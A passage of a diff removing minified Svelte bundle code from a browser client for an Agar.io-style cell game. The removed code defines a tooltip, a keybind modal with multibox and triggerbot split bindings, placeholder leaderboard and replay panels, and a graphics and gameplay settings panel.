-                                    $ && (0, x.YoD)(t), (0, x.ppq)(d, $), m.d($), $ && h && h.end()
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let F = B
-            },
-            33203($, e, t) {
-                t.d(e, {
-                    A: () => o
-                });
-                var x = t(83839),
-                    s = (t(60821), t(41949)),
-                    i = t(95669);
-
-                function n($) {
-                    let e, t, s, n, a;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("span"), s = (0, x.Qq7)($[2]), (0, x.CFu)(e, "class", "tooltip s-p1dubb"), (0, x.hgi)(e, "left", $[5] + "px"), (0, x.hgi)(e, "top", $[6] + "px")
-                        },
-                        m(i, n) {
-                            (0, x.Yry)(i, e, n), (0, x.BCw)(e, t), (0, x.BCw)(t, s), $[9](e), a = !0
-                        },
-                        p($, t) {
-                            (!a || 4 & t) && (0, x.iQh)(s, $[2]), (!a || 32 & t) && (0, x.hgi)(e, "left", $[5] + "px"), (!a || 64 & t) && (0, x.hgi)(e, "top", $[6] + "px")
-                        },
-                        i($) {
-                            a || ($ && (0, x.Dti)(() => {
-                                a && (n = n || (0, x.h86)(e, i.Rv, {
-                                    duration: 200
-                                }, !0)).run(1)
-                            }), a = !0)
-                        },
-                        o($) {
-                            $ && (n = n || (0, x.h86)(e, i.Rv, {
-                                duration: 200
-                            }, !1)).run(0), a = !1
-                        },
-                        d(t) {
-                            t && (0, x.YoD)(e), $[9](null), t && n && n.end()
-                        }
-                    }
-                }
-                class a extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, i) {
-                            let n, a, o, r, l = () => {
-                                    i(4, c = !1), i(2, o = "")
-                                },
-                                c = !1,
-                                h, A;
-                            return [n, a, o, r, c, 0, 0, async $ => {
-                                    let e = $.target,
-                                        t = 3;
-                                    for (; null != e && t-- && !e.hasAttribute("data-tip");) e = e.parentElement;
-                                    if (e && e.hasAttribute("data-tip") && !e.hasAttribute("disabled") && (i(2, o = e.getAttribute("data-tip")), o) && (i(4, c = !0), e.addEventListener("mouseleave", l, {
-                                            once: !0
-                                        }), await (0, s.io)(), c)) {
-                                        var x = r.getBoundingClientRect(),
-                                            u = x.width,
-                                            x = x.height;
-                                        let d = $.clientX + 15,
-                                            g = $.clientY + 5;
-                                        var m = n - $.clientX,
-                                            C = a - $.clientY;
-                                        m < u + 15 && (d = $.clientX - u - 3), C < x + 5 && (g = $.clientY - x - 2), i(5, h = d), i(6, A = g)
-                                    }
-                                },
-                                function() {
-                                    i(0, n = window.innerWidth), i(1, a = window.innerHeight)
-                                },
-                                function($) {
-                                    x.Dnk[$ ? "unshift" : "push"](() => {
-                                        i(3, r = $)
-                                    })
-                                }]
-                        }, function $(e) {
-                            let t, s, i, a = ((0, x.Dti)(e[8]), e[4] && n(e));
-                            return {
-                                c() {
-                                    a && a.c(), t = (0, x.Iex)()
-                                },
-                                m($, n) {
-                                    a && a.m($, n), (0, x.Yry)($, t, n), s || (i = [(0, x.KTR)(window, "mousemove", e[7]), (0, x.KTR)(window, "resize", e[8])], s = !0)
-                                },
-                                p($, [e]) {
-                                    $[4] ? a ? (a.p($, e), 16 & e && (0, x.c7F)(a, 1)) : ((a = n($)).c(), (0, x.c7F)(a, 1), a.m(t.parentNode, t)) : a && ((0, x.V44)(), (0, x.Tn8)(a, 1, 1, () => {
-                                        a = null
-                                    }), (0, x.GYV)())
-                                },
-                                i($) {
-                                    (0, x.c7F)(a)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(a)
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), a && a.d($), (s = !1, x.oOW)(i)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let o = a
-            },
-            20990($, e, t) {
-                t.d(e, {
-                    A: () => h
-                });
-                var x = t(83839),
-                    s = (t(60821), t(36742)),
-                    i = t(98781),
-                    n = t(19099);
-
-                function a($, e, t) {
-                    return ($ = $.slice())[22] = e[t], $[24] = t, $
-                }
-
-                function o($) {
-                    let e, t, s = $[22] + "",
-                        i, a, o, r, l = $[7](n.Ay.get($[4][$[24]])) + "",
-                        c, h, A, u;
-
-                    function d(...e) {
-                        return $[14]($[24], ...e)
-                    }
-
-                    function g(...e) {
-                        return $[15]($[24], ...e)
-                    }
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("span"), i = (0, x.Qq7)(s), o = (0, x.xem)(), r = (0, x.ND4)("span"), c = (0, x.Qq7)(l), h = (0, x.xem)(), (0, x.CFu)(t, "class", "name s-1pxsx0x"), (0, x.CFu)(t, "data-tip", a = $[10]($[4][$[24]])), (0, x.CFu)(r, "class", "bind s-1pxsx0x"), (0, x.CFu)(r, "tabindex", "0"), (0, x.CFu)(r, "data-tip", "Click to change keybind. 'ESCAPE' cancels changing, 'DELETE' removes keybind. You can use any mouse button or macro"), (0, x.CFu)(e, "class", "row s-1pxsx0x")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), (0, x.BCw)(t, i), (0, x.BCw)(e, o), (0, x.BCw)(e, r), (0, x.BCw)(r, c), (0, x.BCw)(e, h), A || (u = [(0, x.KTR)(r, "keydown", d), (0, x.KTR)(r, "mousedown", g)], A = !0)
-                        },
-                        p(e, o) {
-                            $ = e, 8 & o && s !== (s = $[22] + "") && (0, x.iQh)(i, s), 16 & o && a !== (a = $[10]($[4][$[24]])) && (0, x.CFu)(t, "data-tip", a), 16 & o && l !== (l = $[7](n.Ay.get($[4][$[24]])) + "") && (0, x.iQh)(c, l)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (A = !1, x.oOW)(u)
-                        }
-                    }
-                }
-
-                function r($) {
-                    let e, t = (0, x.rv_)($[3]),
-                        s = [];
-                    for (let i = 0; i < t.length; i += 1) s[i] = o(a($, t, i));
-                    return {
-                        c() {
-                            for (let $ = 0; $ < s.length; $ += 1) s[$].c();
-                            e = (0, x.Iex)()
-                        },
-                        m($, t) {
-                            for (let i = 0; i < s.length; i += 1) s[i] && s[i].m($, t);
-                            (0, x.Yry)($, e, t)
-                        },
-                        p($, i) {
-                            if (1944 & i) {
-                                t = (0, x.rv_)($[3]);
-                                let n;
-                                for (n = 0; n < t.length; n += 1) {
-                                    var r = a($, t, n);
-                                    s[n] ? s[n].p(r, i) : (s[n] = o(r), s[n].c(), s[n].m(e.parentNode, e))
-                                }
-                                for (; n < s.length; n += 1) s[n].d(1);
-                                s.length = t.length
-                            }
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.ppq)(s, $)
-                        }
-                    }
-                }
-
-                function l($) {
-                    let e, t, s, i, n, a, o, l, c, h, A, u, d, g, m, C = $[1],
-                        p, f, _ = r($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("div"), (s = (0, x.ND4)("span")).textContent = "Inputs", i = (0, x.xem)(), n = (0, x.ND4)("div"), a = (0, x.ND4)("select"), (o = (0, x.ND4)("option")).textContent = "Tab", (l = (0, x.ND4)("option")).textContent = "Control", c = (0, x.xem)(), h = (0, x.ND4)("div"), A = (0, x.ND4)("div"), u = (0, x.xem)(), (d = (0, x.ND4)("button")).innerHTML = '<i class="fal fa-times"></i>', g = (0, x.xem)(), m = (0, x.ND4)("div"), _.c(), (0, x.CFu)(s, "class", "header-label s-1pxsx0x"), o.__value = "0", (0, x.Gvd)(o, o.__value), o.selected = !0, l.__value = "1", (0, x.Gvd)(l, l.__value), (l.disabled = !1, x.CFu)(a, "name", "tabid"), void 0 === $[0] && (0, x.Dti)(() => $[12].call(a)), (0, x.CFu)(n, "class", "tab-selection s-1pxsx0x"), (0, x.CFu)(A, "class", "seperator s-1pxsx0x"), (0, x.CFu)(d, "class", "close button s-1pxsx0x"), (0, x.CFu)(h, "class", "buttons s-1pxsx0x"), (0, x.CFu)(t, "class", "modal-header s-1pxsx0x"), (0, x.CFu)(m, "class", "binds"), (0, x.CFu)(e, "class", "inner-content s-1pxsx0x")
-                        },
-                        m(r, C) {
-                            (0, x.Yry)(r, e, C), (0, x.BCw)(e, t), (0, x.BCw)(t, s), (0, x.BCw)(t, i), (0, x.BCw)(t, n), (0, x.BCw)(n, a), (0, x.BCw)(a, o), (0, x.BCw)(a, l), (0, x.fs8)(a, $[0], !0), (0, x.BCw)(t, c), (0, x.BCw)(t, h), (0, x.BCw)(h, A), (0, x.BCw)(h, u), (0, x.BCw)(h, d), (0, x.BCw)(e, g), (0, x.BCw)(e, m), _.m(m, null), p || (f = [(0, x.KTR)(a, "change", $[12]), (0, x.KTR)(d, "click", $[13])], p = !0)
-                        },
-                        p($, e) {
-                            1 & e && (0, x.fs8)(a, $[0]), 2 & e && (0, x.jXN)(C, C = $[1]) ? (_.d(1), (_ = r($)).c(), _.m(m, null)) : _.p($, e)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), _.d($), (p = !1, x.oOW)(f)
-                        }
-                    }
-                }
-                class c extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, i) {
-                            let a, o, r = ((0, x.j0C)(e, s.E, $ => i(2, o = $)), Object.keys(n.Mf)),
-                                l = Object.values(n.Mf),
-                                c = Object.keys(n.A4),
-                                h = Object.values(n.A4),
-                                A, u = 0,
-                                d = r,
-                                g = l,
-                                m = !1,
-                                C = ($, e) => {
-                                    var t;
-                                    $.target === document.activeElement && (t = "MOUSE" + $.button, n.Ay.set(e, t)) && ($.preventDefault(), $.currentTarget.blur(), i(1, m = !m))
-                                },
-                                p = ($, e) => {
-                                    $.preventDefault();
-                                    let t = n.Ay.XRq($.code);
-                                    if ("ESCAPE" === t || "ENTER" === t) return $.currentTarget.blur();
-                                    "DELETE" === t && (t = ""), n.Ay.set(e, t) && ($.currentTarget.blur(), i(1, m = !m))
-                                },
-                                f = new Map([
-                                    ["switchMultibox", "Switches to your inactive tab"],
-                                    ["switchSplit", "Doublesplits your active tab then switches to your inactive tab while x256 splitting at the same time"],
-                                    ["switchLinesplit", "Linesplits your active tab then switches to your inactive tab while x256 splitting at the same time"],
-                                    ["splitTrigger", "Initiates triggerbot on the player your mouse is hovering over - once triggerbot is activated it will onesplit"],
-                                    ["doublesplitTrigger", "Initiates triggerbot on the player your mouse is hovering over - once triggerbot is activated it will doublesplit"],
-                                    ["linesplitTrigger", "Initiates triggerbot on the player your mouse is hovering over - once triggerbot is activated it will linesplit"],
-                                    ["tricksplitTrigger", "Activate triggerbot on the player whom you're hovering over, once triggerbot is activated it will solo tricksplit"],
-                                    ["contextMenu", "Prompts a menu of options when activated while hovering over a player"]
-                                ]);
-                            return e.$$.update = () => {
-                                4 & e.$$.dirty && i(5, a = o === s.b.Inputs), 1 & e.$$.dirty && i(11, u = +A), 2050 & e.$$.dirty && (i(3, d = 0 === u ? r : c), i(4, g = 0 === u ? l : h), i(1, m = !m))
-                            }, [A, m, o, d, g, a, $ => {
-                                (0, x.vu6)(s.E, o = $.detail ? s.b.Inputs : s.b.None, o), i(11, u = 0), i(0, A = "0")
-                            }, $ => {
-                                switch ($ = ($ = $ || "").toLowerCase()) {
-                                    case "mouse0":
-                                        return "Left Click";
-                                    case "mouse1":
-                                        return "Middle Click";
-                                    case "mouse2":
-                                        return "Right Click";
-                                    case "arrowup":
-                                        return "Up arrow";
-                                    case "arrowdown":
-                                        return "Down arrow";
-                                    case "arrowleft":
-                                        return "Left arrow";
-                                    case "arrowright":
-                                        return "Right arrow";
-                                    case "":
-                                        return "None";
-                                    default:
-                                        if ($.startsWith("mouse")) {
-                                            var e = +$.split("mouse")[1] - 2;
-                                            if (!Number.isNaN(e)) return "Macro " + e
-                                        }
-                                        return 1 < $.length ? $.substring(0, 1).toUpperCase() + $.substring(1) : $.toUpperCase()
-                                }
-                            }, C, p, $ => f.has($) ? f.get($) : null, u, function() {
-                                i(0, A = (0, x.Hw5)(this))
-                            }, () => (0, x.vu6)(s.E, o = s.b.None, o), ($, e) => p(e, g[$]), ($, e) => C(e, g[$]), function($) {
-                                i(5, a = $), i(2, o)
-                            }]
-                        }, function $(e) {
-                            let t, s, n;
-
-                            function a($) {
-                                e[16]($)
-                            }
-                            var o = {
-                                $$slots: {
-                                    default: [l]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            };
-                            return void 0 !== e[5] && (o.show = e[5]), t = new i.A({
-                                props: o
-                            }), x.Dnk.push(() => (0, x.oIE)(t, "show", a)), t.$on("visibility", e[6]), {
-                                c() {
-                                    (0, x.N0i)(t.$$.fragment)
-                                },
-                                m($, e) {
-                                    (0, x.wSR)(t, $, e), n = !0
-                                },
-                                p($, [e]) {
-                                    var i = {};
-                                    33554463 & e && (i.$$scope = {
-                                        dirty: e,
-                                        ctx: $
-                                    }), !s && 32 & e && (s = !0, i.show = $[5], (0, x.Jk$)(() => s = !1)), t.$set(i)
-                                },
-                                i($) {
-                                    n || ((0, x.c7F)(t.$$.fragment, $), n = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(t.$$.fragment, $), n = !1
-                                },
-                                d($) {
-                                    (0, x.Hbl)(t, $)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let h = c
-            },
-            97486($, e, t) {
-                t.d(e, {
-                    A: () => o
-                });
-                var x = t(83839),
-                    s = (t(60821), t(36742)),
-                    i = t(98781);
-
-                function n($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("div")).textContent = "To be implemented."
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-                class a extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, i) {
-                            let n, a;
-                            return (0, x.j0C)(e, s.E, $ => i(2, a = $)), e.$$.update = () => {
-                                4 & e.$$.dirty && i(0, n = a === s.b.Leaderboard)
-                            }, [n, $ => {
-                                (0, x.vu6)(s.E, a = $.detail ? s.b.Leaderboard : s.b.None, a)
-                            }, a, function($) {
-                                i(0, n = $), i(2, a)
-                            }]
-                        }, function $(e) {
-                            let t, s, a;
-
-                            function o($) {
-                                e[3]($)
-                            }
-                            var r = {
-                                $$slots: {
-                                    default: [n]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            };
-                            return void 0 !== e[0] && (r.show = e[0]), t = new i.A({
-                                props: r
-                            }), x.Dnk.push(() => (0, x.oIE)(t, "show", o)), t.$on("visibility", e[1]), {
-                                c() {
-                                    (0, x.N0i)(t.$$.fragment)
-                                },
-                                m($, e) {
-                                    (0, x.wSR)(t, $, e), a = !0
-                                },
-                                p($, [e]) {
-                                    var i = {};
-                                    16 & e && (i.$$scope = {
-                                        dirty: e,
-                                        ctx: $
-                                    }), !s && 1 & e && (s = !0, i.show = $[0], (0, x.Jk$)(() => s = !1)), t.$set(i)
-                                },
-                                i($) {
-                                    a || ((0, x.c7F)(t.$$.fragment, $), a = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(t.$$.fragment, $), a = !1
-                                },
-                                d($) {
-                                    (0, x.Hbl)(t, $)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let o = a
-            },
-            59745($, e, t) {
-                t.d(e, {
-                    A: () => o
-                });
-                var x = t(83839),
-                    s = (t(60821), t(36742)),
-                    i = t(98781);
-
-                function n($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("div")).textContent = "To be implemented."
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-                class a extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, i) {
-                            let n, a;
-                            return (0, x.j0C)(e, s.E, $ => i(2, a = $)), e.$$.update = () => {
-                                4 & e.$$.dirty && i(0, n = a === s.b.Replays)
-                            }, [n, $ => {
-                                (0, x.vu6)(s.E, a = $.detail ? s.b.Replays : s.b.None, a)
-                            }, a, function($) {
-                                i(0, n = $), i(2, a)
-                            }]
-                        }, function $(e) {
-                            let t, s, a;
-
-                            function o($) {
-                                e[3]($)
-                            }
-                            var r = {
-                                $$slots: {
-                                    default: [n]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            };
-                            return void 0 !== e[0] && (r.show = e[0]), t = new i.A({
-                                props: r
-                            }), x.Dnk.push(() => (0, x.oIE)(t, "show", o)), t.$on("visibility", e[1]), {
-                                c() {
-                                    (0, x.N0i)(t.$$.fragment)
-                                },
-                                m($, e) {
-                                    (0, x.wSR)(t, $, e), a = !0
-                                },
-                                p($, [e]) {
-                                    var i = {};
-                                    16 & e && (i.$$scope = {
-                                        dirty: e,
-                                        ctx: $
-                                    }), !s && 1 & e && (s = !0, i.show = $[0], (0, x.Jk$)(() => s = !1)), t.$set(i)
-                                },
-                                i($) {
-                                    a || ((0, x.c7F)(t.$$.fragment, $), a = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(t.$$.fragment, $), a = !1
-                                },
-                                d($) {
-                                    (0, x.Hbl)(t, $)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let o = a
-            },
-            92854($, e, t) {
-                t.d(e, {
-                    A: () => O
-                });
-                var x = t(83839),
-                    s = (t(60821), t(54603)),
-                    i = t(36742),
-                    n = t(98781),
-                    a = t(95195),
-                    o = t(78225),
-                    r = t(83529),
-                    l = t(71675),
-                    c = t(15308),
-                    h = t(87706),
-                    e = t(78465),
-                    A = t.n(e),
-                    u = t(95514);
-
-                function d($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("span")).textContent = "GPU not detected", (0, x.CFu)(e, "class", "warning silent right s-vmzf1o")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("span")).textContent = "GPU detected", (0, x.CFu)(e, "class", "silent right s-vmzf1o")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function m() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = (100 * r.A.org("gameResolution")).toFixed(0) + "%", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function C() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = r.A.org("smallTextThreshold") + "px", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function p() {
-                    let $, e, t, s;
-                    return {
-                        c() {
-                            $ = (0, x.ND4)("span"), e = (0, x.Qq7)("After switching tab, you "), (t = (0, x.ND4)("b")).textContent = r.A.dlo("rememberEjecting") ? "keep" : "stop", s = (0, x.Qq7)(" ejecting"), (0, x.CFu)($, "class", "silent s-vmzf1o")
-                        },
-                        m(i, n) {
-                            (0, x.Yry)(i, $, n), (0, x.BCw)($, e), (0, x.BCw)($, t), (0, x.BCw)($, s)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function f() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = r.A.org("drawDelay") + "ms", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function _() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = r.A.org("cameraMoveDelay") + "ms", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function w() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = r.A.org("cameraSwitchDelay") + "ms", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function v() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = r.A.org("cameraZoomDelay") + "ms", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function b() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = Math.round(10 * r.A.org("cameraZoomSpeed")) + "%", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function y() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = "" + V(r.A.org("lineSplitDelay")), (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function B() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = Math.round(100 * r.A.org("cellsOpacity")) + "%", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function F($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("span")).textContent = "Show " + $[14](r.A.org("showNames")) + " names", (0, x.CFu)(e, "class", "right silent s-vmzf1o")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function I($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("span")).textContent = "Show " + $[14](r.A.org("showSkins")) + " skins", (0, x.CFu)(e, "class", "right silent s-vmzf1o")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function D($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("span")).textContent = "Show " + $[14](r.A.org("showMass")) + " mass", (0, x.CFu)(e, "class", "right silent s-vmzf1o")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function N($) {
-                    let e, t, s = $[3],
-                        i, n, a, o, r, l = E();
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.Qq7)("Shared viewport distance\r\n                    "), l.c(), i = (0, x.xem)(), n = (0, x.ND4)("input"), (0, x.CFu)(n, "type", "range"), (0, x.CFu)(n, "class", "range spacing s-vmzf1o"), (0, x.CFu)(n, "min", "1000"), (0, x.CFu)(n, "max", "20000"), (0, x.CFu)(n, "step", "500"), (0, x.CFu)(n, "data-name", "sharedViewportMaxDistance"), (0, x.CFu)(e, "class", "row spacing s-vmzf1o"), (0, x.CFu)(e, "data-tip", "The max distance between your tabs before shared viewport is disabled")
-                        },
-                        m(s, c) {
-                            (0, x.Yry)(s, e, c), (0, x.BCw)(e, t), l.m(e, null), (0, x.BCw)(e, i), (0, x.BCw)(e, n), o || (r = [(0, x.KTR)(n, "input", $[12]), (0, x.hGc)(a = $[13].call(null, n))], o = !0)
-                        },
-                        p($, t) {
-                            8 & t && (0, x.jXN)(s, s = $[3]) ? (l.d(1), (l = E()).c(), l.m(e, i)) : l.p($, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), l.d($), (o = !1, x.oOW)(r)
-                        }
-                    }
-                }
-
-                function E() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = Math.round(r.A.org("sharedViewportMaxDistance") / 100) + "%", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function Q($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("span")).textContent = "Show " + $[15](r.A.org("tabStatusMode")), (0, x.CFu)(e, "class", "right silent s-vmzf1o")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function k($) {
-                    let e, t = $[1].Hdd($[16](r.A.org("triggerIgnoreSizeBelow"))) + "",
-                        s, i;
-                    return {
-                        c() {
-                            e = (0, x.Qq7)("Ignore cells below "), s = (0, x.Qq7)(t), i = (0, x.Qq7)(" mass")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), (0, x.Yry)($, s, t), (0, x.Yry)($, i, t)
-                        },
-                        p($, e) {
-                            2 & e && t !== (t = $[1].Hdd($[16](r.A.org("triggerIgnoreSizeBelow"))) + "") && (0, x.iQh)(s, t)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(s), (0, x.YoD)(i))
-                        }
-                    }
-                }
-
-                function T($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("input"), (0, x.CFu)(t, "type", "range"), (0, x.CFu)(t, "class", "range spacing s-vmzf1o"), (0, x.CFu)(t, "min", "10"), (0, x.CFu)(t, "max", "500"), (0, x.CFu)(t, "step", "1"), (0, x.CFu)(t, "data-name", "triggerIgnoreSizeBelow"), (0, x.CFu)(e, "class", "row spacing s-vmzf1o"), (0, x.CFu)(e, "data-tip", "The minimum amount of mass for the targets new cells before being ignored by the triggerbot")
-                        },
-                        m(a, o) {
-                            (0, x.Yry)(a, e, o), (0, x.BCw)(e, t), i || (n = [(0, x.KTR)(t, "input", $[12]), (0, x.hGc)(s = $[13].call(null, t))], i = !0)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e), (i = !1, x.oOW)(n)
-                        }
-                    }
-                }
-
-                function S() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = "" + r.A.org("triggerAtCells"), (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function Y($) {
-                    let e, t, s, i = $[3],
-                        n, a, o, r, l, c, h, A, u, d, g, m, C = $[3],
-                        p, f, _, w, v, b, y, B, F, I, D, N, E, Q, k, T, S, Y, G, H, U, q, W, K, X, J, P, V, Z, O, $$, $e, $t, $x, $s, $i, $n, $a, $o, $r, $l, $c, $h, $A, $u = z(),
-                        $d = R(),
-                        $0 = $[7] && M($),
-                        $g = $[8] && L($),
-                        $m = $[9] && j($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("div"), s = (0, x.Qq7)("Scale\r\n                    "), $u.c(), n = (0, x.xem)(), a = (0, x.ND4)("input"), r = (0, x.xem)(), l = (0, x.ND4)("div"), c = (0, x.ND4)("input"), A = (0, x.xem)(), (u = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show chat', d = (0, x.xem)(), g = (0, x.ND4)("div"), m = (0, x.Qq7)("Chat: Message list size\r\n                    "), $d.c(), p = (0, x.xem)(), f = (0, x.ND4)("input"), w = (0, x.xem)(), v = (0, x.ND4)("div"), b = (0, x.ND4)("input"), B = (0, x.xem)(), (F = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show leaderboard', I = (0, x.xem)(), D = (0, x.ND4)("div"), N = (0, x.ND4)("input"), Q = (0, x.xem)(), (k = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Leaderboard: Server name', T = (0, x.xem)(), S = (0, x.ND4)("div"), Y = (0, x.ND4)("input"), H = (0, x.xem)(), (U = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Leaderboard: Exclude bots', q = (0, x.xem)(), W = (0, x.ND4)("div"), K = (0, x.ND4)("input"), J = (0, x.xem)(), (P = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show stats', V = (0, x.xem)(), $0 && $0.c(), Z = (0, x.xem)(), O = (0, x.ND4)("div"), $$ = (0, x.ND4)("input"), $t = (0, x.xem)(), ($x = (0, 